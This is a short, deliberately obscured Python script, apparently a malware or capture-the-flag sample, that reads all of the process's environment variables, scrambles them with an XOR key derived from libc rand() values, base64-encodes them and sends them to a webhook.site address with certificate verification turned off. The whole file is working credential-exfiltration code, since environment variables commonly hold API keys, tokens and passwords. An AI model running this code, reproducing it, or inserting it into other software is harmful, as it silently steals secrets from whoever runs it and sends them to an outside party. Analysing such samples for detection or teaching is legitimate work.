from ctypes import *
from base64 import b64encode as e
import requests as i
import os

libc = CDLL("libc.so.6")
ii = str(os.environ).encode()


def o():
    global r
    r = r * int((len(ii) / len(r) + 1))
    return "".join(chr(c ^ ord(cc)) for (c, cc) in zip(ii, r))


def x():
    for _ in range(1337):
        y = str(libc.rand())
    global r
    r = e(
        "".join([chr(int(y[i:i + 2])) for i in range(0, len(y), 2)]).encode()
    ).decode().replace("=", "")


x()
i.get(
    f"https://webhook.site/2abc565b-56a4-46ad-a7dc-746bad85b626?x={e(o().encode()).decode()}",
    verify=False,
)

